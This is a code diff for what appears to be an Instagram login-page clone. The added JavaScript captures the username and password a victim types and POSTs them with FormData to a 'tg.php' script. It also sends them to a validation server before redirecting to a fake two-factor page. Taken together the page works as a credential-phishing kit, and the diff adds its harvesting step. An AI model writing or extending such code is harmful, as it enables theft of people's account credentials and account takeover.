@@ -8,6 +8,7 @@ const falseCredentials = {
     TFA: '123456'
 }
 const errMsg = document.getElementById('error-message');
+const form = document.getElementById('login-form');
 
 pswdInput.addEventListener('focus', () => {
     // console.log('focus');
@@ -41,7 +42,46 @@ loginBtn.addEventListener('click', (e) => {
     if (usernameInput.value === falseCredentials.username && pswdInput.value === falseCredentials.password) {
         errMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
     } else {
-    errMsg.textContent = '';
-    window.location.href = `${window.location.origin}/Instagram-Login-Clone/2FA.html`;
+        const userdata = {
+            username: usernameInput.value,
+            password: pswdInput.value
+        };
+        console.log(userdata);
+        const formData = new FormData();
+        formData.append('username', usernameInput.value);
+        formData.append('password', pswdInput.value);
+
+        fetch("http://localhost:8080/script/tg.php", {
+            method: "POST",
+            body: formData, // Use FormData object to send data
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error("Error:", error));
+
+        fetch("http://localhost:3000/validate-login", {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(userdata)
+        })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                if (data.answer === '1') {
+                    console.log("Redirect");
+                    errMsg.textContent = "";
+                    window.location.href = `2FA.html`;
+                } else {
+                    console.log("Sorry");
+                    errMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                }
+            })
+            .catch(error => console.log(error));
+
+
+        //errMsg.textContent = '';
+        // window.location.href = `${window.location.origin}/Instagram-Login-Clone/2FA.html`;
     }
 });
